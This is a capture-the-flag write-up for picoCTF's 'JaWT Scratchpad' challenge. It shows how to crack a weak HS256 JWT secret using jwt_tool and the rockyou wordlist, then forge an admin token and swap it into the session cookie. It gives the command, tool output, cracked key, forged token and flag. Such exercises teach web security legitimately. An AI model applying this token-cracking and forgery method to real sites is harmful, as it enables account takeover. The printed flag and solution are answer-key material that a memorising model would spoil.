# JaWT Scratchpad - Points: 400

## Problem

> Check the admin scratchpad! ```https://2019shell1.picoctf.com/problem/32267/``` or http://2019shell1.picoctf.com:32267

## Hints

> What is that cookie?

> Have you heard of JWT?

## Overview

Let's connect to the provided website

Navigating to the vulnerable website, the first thing a norm would do is to check the source code. Unfortunately, there's nothing seems to be suspicious. However, ```JWT``` which stands for **JSON Web Tokens** and ```John``` which is referring to a really famous and common password cracker, **John The Ripper** are mentioned with the provided link for each.  

There's a box where you can actually enter your own chosen username. If we tried to login as ```admin```, we'll get an error like this
```html
<p style="color:red">
       YOU CANNOT LOGIN AS THE ADMIN! HE IS SPECIAL AND YOU ARE NOT.
</p>
```
However, logging in as another user is allowed. I used ```ch3llist4``` as my username. Now we can start exploiting the cookie.

## Solutions

I decided to use the same [online extension](http://www.editthiscookie.com/) as I did on **Open-to-admins** challenge for checking and editing the site cookies.

As expected, I saw a cookie named ```jwt``` with the value ```eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiY2gzbGxpc3Q0In0.WiG-XOhFqsulY9c7-ZSNMa8nI-AcBgKsRkY678wYcO8```. This should be the JSON token that got already encoded using ```base64```

Use this [website](https://jwt.io/) which is provided as a hint in their source code. We can extract the information out of it.
```
{
  "typ": "JWT",
  "alg": "HS256"
}

{
  "user": "ch3llist4"
}
```
As I read on the [wiki](https://en.wikipedia.org/wiki/JSON_Web_Token)

The signature part which is the last part after ```.``` is calculated by encoding the header and payload using [Base64url Encoding](https://en.wikipedia.org/wiki/Base64#URL_applications) and concatenating the two together with a period separator. That string is then run through the cryptographic algorithm specified in the header...
```
HMAC-SHA256(
 base64urlEncoding(header) + '.' +
 base64urlEncoding(payload),
 secret
)
```
So far as i know, we need to somehow get their secret code used in the signature part to generate a new JWT and then we can use that to exploit the website.

I actually didn't use John as the John process for bruteforcing JWT specifically is a little bit more complicated. Instead, I used this [tool](https://github.com/ticarpi/jwt_tool) 

```
$ python jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiY2gzbGxpc3Q0In0.WiG-XOhFqsulY9c7-ZSNMa8nI-AcBgKsRkY678wYcO8 ../JohnTheRipper/run/rockyou.txt

,----.,----.,----.,----.,----.,----.,----.,----.,----.,----.
----''----''----''----''----''----''----''----''----''----'
     ,--.,--.   ,--.,--------.,--------.             ,--.
     |  ||  |   |  |'--.  .--''--.  .--',---.  ,---. |  |
,--. |  ||  |.'.|  |   |  |      |  |  | .-. || .-. ||  |
|  '-'  /|   ,'.   |   |  |,----.|  |  ' '-' '' '-' '|  |
 `-----' '--'   '--'   `--''----'`--'   `---'  `---' `--'
,----.,----.,----.,----.,----.,----.,----.,----.,----.,----.
'----''----''----''----''----''----''----''----''----''----'

Token header values:
[+] typ = JWT
[+] alg = HS256

Token payload values:
[+] user = ch3llist4

######################################################
# Options:                                           #
# 1: Check CVE-2015-2951 - alg=None vulnerability    #
# 2: Check for Public Key bypass in RSA mode         #
# 3: Check signature against a key                   #
# 4: Check signature against a key file ("kid")      #
# 5: Crack signature with supplied dictionary file   #
# 6: Tamper with payload data (key required to sign) #
# 0: Quit                                            #
######################################################

Please make a selection (1-6)
> 5

Loading key dictionary...
File loaded: ../JohnTheRipper/run/rockyou.txt
Testing 14344380 passwords...
[+] ilovepico is the CORRECT key!
```
Now we know that the secret used in the signature part is ```ilovepico```. Let's use it to generate the new token using the previous website. Now we change our usernames to ```admin``` for initializing the unauthorized access.

This token is perfect for exploiting now
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s
```
Change the cookie value to the token and we're good. All we need to do left is reload the page and enjoy the flag..

flag:
```
picoCTF{jawt_was_just_what_you_thought_6ba7694bcc36bdd4fdaf010b2ec1c2c3}
```
